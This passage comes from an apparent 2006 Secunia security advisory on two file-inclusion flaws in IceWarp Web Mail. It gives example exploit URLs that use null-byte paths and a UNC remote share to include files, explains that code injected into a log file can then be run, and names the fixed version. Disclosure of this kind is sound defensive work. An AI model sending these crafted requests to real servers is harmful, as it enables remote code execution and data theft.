3) Description of Vulnerability

Secunia Research has discovered two vulnerabilities in IceWarp Web
Mail, which can be exploited by malicious users and by malicious
people to disclose potentially sensitive information and compromise
a vulnerable system.

1) Input passed to the "language" and "lang_settings" parameters in
"/accounts/inc/include.php" and "/admin/inc/include.php" is not
properly sanitised by the "securepath()" function before being used to
include files. This can be exploited to include arbitrary files from
local resources on the Windows platform using full pathnames.  This
can further be exploited to execute arbitrary PHP code by injecting
the code into the mail server's log file and including it.

Example:
http://[host]:32000/admin/inc/include.php?
language=0&lang_settings[0][1]=c:\[file]%00

The vulnerability is related to #5 in:
SA17046

Successful exploitation allows execution of arbitrary PHP code on
a vulnerable server without requiring authentication.

2) Input passed to the "language" parameter in "/mail/settings.html"
is not properly validated before being saved to the database. This 
can be exploited in conjunction with overwrite of the "lang_settings"
variable, which is not properly sanitised by the "validatefolder()"
function, to include arbitrary files from local resources using
full pathnames and from remote Windows shared folders using UNC
pathnames.

Examples:
http://[host]:32000/mail/settings.html?
id=[current_id]&Save_x=1&language=TEST
http://[host]:32000/mail/index.html?
id=[curent_id]&lang_settings[TEST]=test;
&lang_settings[TEST]=test;c:\[file]%00;
http://[host]:32000/mail/index.html
?id=[curent_id]&lang_settings[TEST]=test;
&lang_settings[TEST]=test;\\[host]\[share]\[file]%00;

Successful exploitation allows execution of arbitrary PHP code on a
vulnerable server but requires a valid logon.

The vulnerability is related to #7 in:
SA17046

====================================================================== 
4) Solution 

Update to version 8.3.8.r with IceWarp Web Mail 5.6.1.

====================================================================== 
5) Time Table 

21/02/2006 - Initial vendor notification.
22/02/2006 - Initial vendor reply and fixed version released.
17/07/2006 - Public disclosure.
